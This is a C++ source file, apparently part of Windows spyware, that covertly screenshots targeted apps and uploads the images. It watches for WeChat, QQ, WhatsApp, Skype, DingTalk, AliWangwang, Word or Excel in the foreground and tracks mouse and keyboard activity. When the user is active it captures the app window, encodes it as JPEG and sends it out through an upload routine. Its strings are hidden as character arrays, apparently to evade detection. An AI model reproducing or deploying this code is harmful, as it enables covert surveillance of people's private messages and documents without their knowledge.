#include <Windows.h>
#include "../api.h"
#include "../public.h"
#include "AppScreenshot.h"
#include "ScreenSnapshot.h"
#include "../network/NetWorkdata.h"
#include "GetScreenFrame.h"
#include "../log.h"

#pragma comment(lib, "GdiPlus.lib")


using namespace Gdiplus;

using namespace std;

class GdiPlusIniter
{
public:
	GdiPlusIniter()
	{
		GdiplusStartupInput StartupInput;
		lpGdiplusStartup(&m_gdiplusToken, &StartupInput, NULL);
	}

	~GdiPlusIniter()
	{
		lpGdiplusShutdown(m_gdiplusToken);
	}
private:
	ULONG_PTR m_gdiplusToken;
};
// //need to initialize the Gdiplus object,else the function in screenshot will be in error








int __stdcall GetAppScreenshot(int iWaitTime)
{
	GdiPlusIniter GdiPlusIniterGlobal;

	int iRet = 0;

	//char szWordWindowName[]		= {'_','W','w','G',0};
	//char szExcelWindowName[]		= {'E','X','C','E','L',0};
	//char szAliWangwangWindowName[]= {'A','e','f','_','R','e','n','d','e','r','W','i','d','g','e','t','H','o','s','t','H','W','N','D',0};
	//char szWhatsappWindowName[]		= {'I','n','t','e','r','m','e','d','i','a','t','e',' ','D','3','D',' ','W','i','n','d','o','w',0};
	//char szNewSkypeWindowName[]		= {'A','p','p','l','i','c','a','t','i','o','n','F','r','a','m','e','W','i','n','d','o','w',0};
	//char szWechatLogin[]		= "WeChatLoginWndForPC";
	//char szWordCap[]		= "Microsoft Word 文档";
	//char szRealSkype[]		= {'S','k','y','p','e',0};
	//char szWangwangGBK[]	= {(char)0xb0,(char)0xa2,(char)0xc0,(char)0xef,(char)0xcd,(char)0xfa,(char)0xcd,(char)0xfa,0};
	//char szWechatCap[]		= "微信";

	char szAppWindowClassNameList[][64] = {
	{ 'T','X','G','u','i','F','o','u','n','d','a','t','i','o','n',0 },
	 { 'W','e','C','h','a','t','M','a','i','n','W','n','d','F','o','r','P','C',0 },
	 { 'S','t','a','n','d','a','r','d','F','r','a','m','e',0 },
	{ 'Q','W','i','d','g','e','t',0 },
	{ 't','S','k','M','a','i','n','F','o','r','m',0 },
	{ 'O','p','u','s','A','p','p',0 },
	{ 'X','L','M','A','I','N',0 },
	{ 'C','h','r','o','m','e','_','W','i','d','g','e','t','W','i','n','_','1',0 },
	{ 'S','t','a','n','d','a','r','d','F','r','a','m','e','_','D','i','n','g','T','a','l','k',0 },
	};

	char szAppNameList[][64] = {
	{ 'Q','Q',0 },
	{ 'W','E','C','H','A','T',0 },
	{ 'A','L','I','W','A','N','G','W','A','N','G',0 },
	{ 'Y','Y',0 },
	 { 'W','O','R','D',0 },
	 { 'E','X','C','E','L',0 },
	 { 'W','H','A','T','S','A','P','P',0 },
	 { 'S','K','Y','P','E',0 },
	 { 'd','i','n','g','t','A','l','k',0 },
	};

	int iAppCounter = sizeof(szAppWindowClassNameList) / sizeof(szAppWindowClassNameList[0]);

	char szScreenDCName[] = { 'D','I','S','P','L','A','Y',0 };

	char szusJpgFormat[] = { 'i',0,'m',0,'a',0,'g',0,'e',0,'/',0,'j',0,'p',0,'e',0,'g',0,0,0 };
	//char szusJpgFormat[]	= {'i',0,'m',0,'a',0,'g',0,'e',0,'/',0,'b',0,'m',0,'p',0,0,0};

	__try
	{

		int bFindWinByClass = FALSE;

		int iWaitCnt = 0;

		int iFlagMouseKey = 0;

		POINT stLastPoint = { 0 };

		BYTE szLastKeyboardState[VIRTUAL_KEY_SIZE] = { 0 };

		while (TRUE)
		{
			lpSleep(SREENSNAPSHOT_WAIT_TIME_INTERVAL);

			HWND hTopWnd = lpGetForegroundWindow();
			if (hTopWnd == FALSE)
			{
				continue;
			}

			RECT stAppRect = { 0 };

			int iAppIndex = 0;

			//不用window名称查找
			if (bFindWinByClass == TRUE)
			{
				for (iAppIndex = 0; iAppIndex < iAppCounter; iAppIndex++)
				{
					HWND hAppWnd = lpFindWindowA(0, szAppNameList[iAppIndex]);
					if (hAppWnd && hAppWnd == hTopWnd)
					{
						iRet = lpGetWindowRect(hTopWnd, &stAppRect);
						break;
					}

				}
			}
			else {
				char szWindowClassName[MAX_PATH] = { 0 };
				iRet = lpGetClassNameA(hTopWnd, szWindowClassName, MAX_PATH);
				if (iRet == FALSE || *szWindowClassName == 0)
				{
					continue;
				}

				for (iAppIndex = 0; iAppIndex < iAppCounter; iAppIndex++)
				{
					if (lplstrcmpiA(szWindowClassName, szAppWindowClassNameList[iAppIndex]) == 0)
					{
						iRet = lpGetWindowRect(hTopWnd, &stAppRect);
						break;
					}
				}
			}

			if (iAppIndex >= iAppCounter || (stAppRect.right - stAppRect.left == 0 || stAppRect.bottom - stAppRect.top == 0))
			{
				continue;
			}

			POINT stCurPoint = { 0 };
			iRet = lpGetCursorPos(&stCurPoint);
			if (lpRtlCompareMemory((char*)&stLastPoint, (char*)&stCurPoint, sizeof(POINT)) != sizeof(POINT))
			{
				lpRtlMoveMemory((char*)&stLastPoint, (char*)&stCurPoint, sizeof(POINT));
				iFlagMouseKey++;
			}

			BYTE szCurKeyboardState[VIRTUAL_KEY_SIZE] = { 0 };
			iRet = lpGetKeyboardState(szCurKeyboardState);
			if (lpRtlCompareMemory((char*)szLastKeyboardState, (char*)szCurKeyboardState, VIRTUAL_KEY_SIZE) != VIRTUAL_KEY_SIZE)
			{
				lpRtlMoveMemory((char*)&szLastKeyboardState, (char*)&szCurKeyboardState, VIRTUAL_KEY_SIZE);
				iFlagMouseKey++;
			}

			iWaitCnt++;
			if (iWaitCnt > iWaitTime / 3)
			{
				iWaitCnt = 0;
				if (iFlagMouseKey)
				{
					if (iFlagMouseKey >= 3)
					{
						iFlagMouseKey = 0;
					}
					else {
						iFlagMouseKey = 0;
						continue;
					}
				}
				else {
					continue;
				}
			}
			else {
				continue;
			}

			//check if is in screen save state
			int  iParam = 1;
			lpSystemParametersInfoA(SPI_GETSCREENSAVERRUNNING, 0, (PVOID)&iParam, 0);
			if (iParam)
			{
				//writeLog("screen is sleeping\r\n");
				continue;
			}

			int xscrn = stAppRect.right - stAppRect.left;			//lpGetDeviceCaps(hdc, HORZRES);
			int yscrn = stAppRect.bottom - stAppRect.top;			//lpGetDeviceCaps(hdc, VERTRES);

			int dwbmbitssize = 0;
			char* pixelData = 0;
			char* lpBuf = lpGlobalAlloc(GPTR, BMP_STREAM_SIZE);
			int dwBufSize = GetScreenFrame(BITSPERPIXEL, szScreenDCName, stAppRect.left, stAppRect.top, xscrn, yscrn, lpBuf, &pixelData, &dwbmbitssize);
			if (dwBufSize == FALSE)
			{
				continue;
			}

			IStream* istrBmp = NULL;
			IStream* istrJpg = NULL;
			iRet = _lpCreateStreamOnHGlobal(lpBuf, FALSE, &istrBmp);
			Bitmap stBmp(istrBmp);

			EncoderParameters encoderParameters;
			CLSID jpgClsid;

			if (GetEncoderClsid((const WCHAR*)szusJpgFormat, &jpgClsid) == -1)
			{
				writeLog("AppScreenSnapShot GetEncoderClsid error\r\n");
				continue;
			}
			encoderParameters.Count = 1;
			encoderParameters.Parameter[0].Guid = EncoderQuality;
			encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
			encoderParameters.Parameter[0].NumberOfValues = 1;

			ULONG quality = JPG_TRANSFORM_QUALITY;
			encoderParameters.Parameter[0].Value = &quality;

			unsigned char* lpJpg = (unsigned char*)lpGlobalAlloc(GPTR, JPG_STREAM_SIZE);
			iRet = _lpCreateStreamOnHGlobal(lpJpg, FALSE, &istrJpg);

			Status status = stBmp.Save(istrJpg, &jpgClsid, &encoderParameters);
			if (status == 0)
			{
				if (*lpJpg == 0xff && *(lpJpg + 1) == 0xd8 && *(lpJpg + 2) == 0xff && *(lpJpg + 3) == 0xe0)
				{
					char* cTmp = _lpHexStrStr((char*)lpJpg, JPG_STREAM_SIZE, "\xff\xd9", 2);
					if (cTmp)
					{
						iRet = uploadData((char*)lpJpg, cTmp + 2 - (char*)lpJpg, APPSCREENSNAPSHOT, szAppNameList[iAppIndex]);
					}
				}
			}

			istrJpg->Release();
			istrBmp->Release();
			lpGlobalFree(lpBuf);
			lpGlobalFree((char*)lpJpg);
			continue;
		}
	}
	__except (1)
	{
		writeLog("AppScreenSnapShot exception\r\n");
		return FALSE;
	}
}


